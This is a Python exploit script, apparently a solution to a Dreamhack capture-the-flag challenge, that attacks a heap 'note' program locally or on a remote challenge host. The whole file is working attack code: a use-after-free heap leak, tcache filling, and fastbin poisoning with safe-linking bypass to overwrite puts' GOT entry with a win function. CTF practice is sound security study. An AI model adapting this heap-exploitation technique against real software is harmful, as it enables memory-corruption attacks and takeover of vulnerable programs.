#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./note_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 16864)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def create(idx: int, size: int, data: bytes, line=True):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"idx: ", str(idx).encode())
        io.sendlineafter(b"size: ", str(size).encode())
        if line:
            io.sendlineafter(b"data: ", data)
        else:
            io.sendafter(b"data: ", data)
        return

    def read(idx: int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"idx: ", str(idx).encode())
        io.recvuntil(b"data: ")
        return io.recvuntil(b"\n1. create", drop=True)

    def update(idx: int, data: bytes, line=True):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"idx: ", str(idx).encode())
        if line:
            io.sendlineafter(b"data: ", data)
        else:
            io.sendafter(b"data: ", data)
        return

    def delete(idx: int):
        io.sendlineafter(b"> ", b"4")
        io.sendlineafter(b"idx: ", str(idx).encode())
        return

    # no pie
    exe.base = 0x3FE000

    # heap leak
    create(0, 0x18, b"")
    delete(0)
    heap_base = ptr.u64(read(0)) << 12
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # fast poisoning
    puts_got = unwrap(exe.got("puts"))
    win = 0x401256

    ## fill tcache
    for _ in range(6):
        create(0, 0x18, b"")
        delete(0)
        continue

    ## fastbin poisoning to do GOT overwrite
    ### uaf
    create(0, 0x18, b"")
    create(1, 0x18, b"")
    delete(1)
    delete(0)
    link = (heap_base + 0x3E0) >> 12 ^ (exe.base + 0x60E0)
    update(0, ptr.p64(link))
    create(2, 0x18, b"")
    ### make fake size at chunk array
    create(4, 0x21, b"")
    ### modify a pointer at chunks array to puts_got
    create(3, 0x18, ptr.p64(puts_got))
    ### GOT overwrite
    update(4, ptr.p64(win))

    io.interactive()
    return


if __name__ == "__main__":
    main()
